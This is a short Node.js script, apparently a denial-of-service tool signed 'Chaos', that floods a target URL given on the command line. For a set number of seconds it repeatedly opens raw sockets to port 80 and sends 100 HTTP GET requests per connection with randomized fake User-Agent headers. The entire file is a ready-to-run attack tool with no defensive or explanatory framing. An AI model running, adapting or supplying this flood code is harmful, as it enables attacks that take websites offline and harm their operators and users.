const url = require("url");
const EventEmitter = require('events');
fakeUa = require('fake-useragent')
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY); 
if(process.argv.length !== 4){
console.log("By Chaos  ! ")
console.log("node socket.js url time");
process.exit(0)
}
var target = process.argv[2];
var time = process.argv[3];
var host = url.parse(target).host;
var intv = setInterval(()=>{
const client = require("net").Socket()
var ua = fakeUa()
var pakete = 'GET ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'
client.connect(80,host)
client.setTimeout(10000);
for(let i=0;i<100;i++){
client.write(pakete)
}
client.on('data',()=>{
setTimeout(()=>{
client.destroy();
return delete client;
})
})


setTimeout(()=>clearInterval(intv),time*1000)
})
console.log("Start Attakc Chaos ... !")


process.on('uncaughtException', function (err) {
	console.log(err);
});

process.on('unhandledRejection', function (err) {
	console.log(err);
});
